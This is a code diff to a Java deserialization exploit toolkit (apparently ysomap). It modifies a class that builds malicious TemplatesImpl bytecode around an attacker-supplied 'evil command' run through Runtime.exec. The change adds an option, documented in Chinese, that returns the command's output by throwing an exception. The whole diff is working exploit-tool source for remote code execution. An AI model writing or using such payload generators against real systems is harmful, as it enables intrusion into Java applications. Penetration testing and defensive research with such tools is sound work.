@@ -12,6 +12,7 @@ import javassist.CtClass;
 import ysomap.common.annotation.*;
 import ysomap.core.bean.Bullet;
 import ysomap.core.util.ClassFiles;
+import ysomap.core.util.PayloadHelper;
 import ysomap.core.util.ReflectionHelper;
 
 import java.io.Serializable;
@@ -34,14 +35,21 @@ public class TemplatesImplBullet extends Bullet<Object> {
     @Require(name = "body" ,detail = "evil code (start with 'code:') or evil commands")
     private String body;
 
+    @Require(name = "exception", type = "boolean", detail = "是否需要以抛异常的方式返回执行结果，默认为false")
+    private String exception = "false";
+
     @Override
     public Object getObject() throws Exception {
         if(body.startsWith("code:")){// code mode
             body = body.substring(5);
         }else{// system command execute mode
-            body = "java.lang.Runtime.getRuntime().exec(\"" +
-                    body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
-                    "\");";
+            if("false".equals(exception)){
+                body = "java.lang.Runtime.getRuntime().exec(\"" +
+                        body.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
+                        "\");";
+            }else{
+                body = PayloadHelper.makeExceptionPayload(body);
+            }
         }
         initClazz();
         // create evil bytecodes
